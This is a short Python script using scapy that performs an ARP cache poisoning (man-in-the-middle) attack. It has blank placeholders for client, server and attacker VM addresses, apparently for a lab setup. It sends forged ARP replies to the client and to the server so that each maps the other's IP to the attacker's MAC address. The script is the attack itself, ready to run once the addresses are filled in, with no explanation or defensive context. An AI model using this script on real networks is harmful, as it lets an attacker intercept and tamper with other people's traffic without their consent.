#!/usr/bin/python

from scapy.all import *

VM_CLIENT_IP = ""
VM_CLIENT_MAC = ""
VM_SERVER_IP = ""
VM_SERVER_MAC = ""
VM_ATTACKER_IP = ""
VM_ATTACKER_MAC = ""

Ea = Ether()
Ea.dst = VM_CLIENT_MAC
Aa = ARP()
Aa.psrc = VM_SERVER_IP
Aa.hwsrc = VM_ATTACKER_MAC
Aa.op = 2
pkta = Ea/Aa
sendp(pkta)

Eb = Ether()
Eb.dst = VM_SERVER_MAC
Ab = ARP()
Ab.psrc = VM_CLIENT_IP
Ab.hwsrc = VM_ATTACKER_MAC
Ab.op = 2
pktb = Eb/Ab
sendp(pktb)
